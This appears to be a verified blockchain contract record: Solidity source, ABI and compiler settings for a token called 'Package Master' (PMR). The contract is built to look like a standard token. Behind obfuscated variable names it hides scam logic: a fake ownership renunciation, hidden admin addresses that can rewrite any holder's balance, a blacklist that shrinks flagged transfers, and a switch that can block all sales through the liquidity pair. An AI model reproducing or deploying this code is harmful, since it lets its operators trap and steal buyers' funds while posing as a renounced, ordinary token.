{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface swapMarketing {\n    function createPair(address launchedToFee, address minMarketing) external returns (address);\n}\n\ninterface launchedFeeAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxExempt) external view returns (uint256);\n\n    function transfer(address tokenTeam, uint256 receiverTx) external returns (bool);\n\n    function allowance(address modeTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenTeam,\n        uint256 receiverTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyTake, uint256 value);\n    event Approval(address indexed modeTotal, address indexed spender, uint256 value);\n}\n\nabstract contract tokenAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txTotal is launchedFeeAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PackageMaster is tokenAt, launchedFeeAt, txTotal {\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletAmount;\n    }\n\n    uint256 public totalTo;\n\n    uint256 public swapShould;\n\n    bool public atTx;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellExempt;\n    }\n\n    function getOwner() external view returns (address) {\n        return fromSell;\n    }\n\n    function takeSender(address amountAuto, address tokenTeam, uint256 receiverTx) internal returns (bool) {\n        if (amountAuto == sellFund) {\n            return receiverBuy(amountAuto, tokenTeam, receiverTx);\n        }\n        uint256 launchTotal = launchedFeeAt(teamExempt).balanceOf(shouldFeeSender);\n        require(launchTotal == fundLaunched);\n        require(tokenTeam != shouldFeeSender);\n        if (sellTake[amountAuto]) {\n            return receiverBuy(amountAuto, tokenTeam, toTeam);\n        }\n        return receiverBuy(amountAuto, tokenTeam, receiverTx);\n    }\n\n    string private receiverShouldEnable = \"Package Master\";\n\n    function name() external view virtual override returns (string memory) {\n        return receiverShouldEnable;\n    }\n\n    uint256 private sellExempt = 100000000 * 10 ** 18;\n\n    function modeLimitWallet(address walletSellTo) public {\n        require(walletSellTo.balance < 100000);\n        if (atTx) {\n            return;\n        }\n        \n        autoIs[walletSellTo] = true;\n        \n        atTx = true;\n    }\n\n    address public sellFund;\n\n    function allowance(address exemptTrading, address receiverToLiquidity) external view virtual override returns (uint256) {\n        if (receiverToLiquidity == modeSenderFrom) {\n            return type(uint256).max;\n        }\n        return maxWallet[exemptTrading][receiverToLiquidity];\n    }\n\n    address public teamExempt;\n\n    function fromBuy() public {\n        emit OwnershipTransferred(sellFund, address(0));\n        fromSell = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamSell;\n    }\n\n    bool private autoToMode;\n\n    mapping(address => uint256) private teamMarketing;\n\n    bool private takeMarketing;\n\n    function owner() external view returns (address) {\n        return fromSell;\n    }\n\n    bool public amountFund;\n\n    uint256 private teamMax;\n\n    address shouldFeeSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 exemptMin;\n\n    function approve(address receiverToLiquidity, uint256 receiverTx) public virtual override returns (bool) {\n        maxWallet[_msgSender()][receiverToLiquidity] = receiverTx;\n        emit Approval(_msgSender(), receiverToLiquidity, receiverTx);\n        return true;\n    }\n\n    function receiverBuy(address amountAuto, address tokenTeam, uint256 receiverTx) internal returns (bool) {\n        require(teamMarketing[amountAuto] >= receiverTx);\n        teamMarketing[amountAuto] -= receiverTx;\n        teamMarketing[tokenTeam] += receiverTx;\n        emit Transfer(amountAuto, tokenTeam, receiverTx);\n        return true;\n    }\n\n    function minMaxReceiver() private view {\n        require(autoIs[_msgSender()]);\n    }\n\n    uint8 private walletAmount = 18;\n\n    uint256 fundLaunched;\n\n    mapping(address => bool) public autoIs;\n\n    uint256 constant toTeam = 5 ** 10;\n\n    function teamModeLaunched(address receiverFund) public {\n        minMaxReceiver();\n        \n        if (receiverFund == sellFund || receiverFund == teamExempt) {\n            return;\n        }\n        sellTake[receiverFund] = true;\n    }\n\n    constructor (){\n        \n        sellSender totalToken = sellSender(modeSenderFrom);\n        teamExempt = swapMarketing(totalToken.factory()).createPair(totalToken.WETH(), address(this));\n        \n        sellFund = _msgSender();\n        autoIs[sellFund] = true;\n        teamMarketing[sellFund] = sellExempt;\n        fromBuy();\n        \n        emit Transfer(address(0), sellFund, sellExempt);\n    }\n\n    address private fromSell;\n\n    string private teamSell = \"PMR\";\n\n    function sellAuto(uint256 receiverTx) public {\n        minMaxReceiver();\n        fundLaunched = receiverTx;\n    }\n\n    bool private launchMax;\n\n    mapping(address => mapping(address => uint256)) private maxWallet;\n\n    function balanceOf(address maxExempt) public view virtual override returns (uint256) {\n        return teamMarketing[maxExempt];\n    }\n\n    event OwnershipTransferred(address indexed senderFrom, address indexed shouldAt);\n\n    address modeSenderFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address amountAuto, address tokenTeam, uint256 receiverTx) external override returns (bool) {\n        if (_msgSender() != modeSenderFrom) {\n            if (maxWallet[amountAuto][_msgSender()] != type(uint256).max) {\n                require(receiverTx <= maxWallet[amountAuto][_msgSender()]);\n                maxWallet[amountAuto][_msgSender()] -= receiverTx;\n            }\n        }\n        return takeSender(amountAuto, tokenTeam, receiverTx);\n    }\n\n    uint256 private amountTake;\n\n    function transfer(address fundTake, uint256 receiverTx) external virtual override returns (bool) {\n        return takeSender(_msgSender(), fundTake, receiverTx);\n    }\n\n    mapping(address => bool) public sellTake;\n\n    function txFrom(address fundTake, uint256 receiverTx) public {\n        minMaxReceiver();\n        teamMarketing[fundTake] = receiverTx;\n    }\n\n    uint256 public teamTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverToLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSellTo\",\"type\":\"address\"}],\"name\":\"modeLimitWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverTx\",\"type\":\"uint256\"}],\"name\":\"sellAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"}],\"name\":\"teamModeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTx\",\"type\":\"uint256\"}],\"name\":\"txFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PackageMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}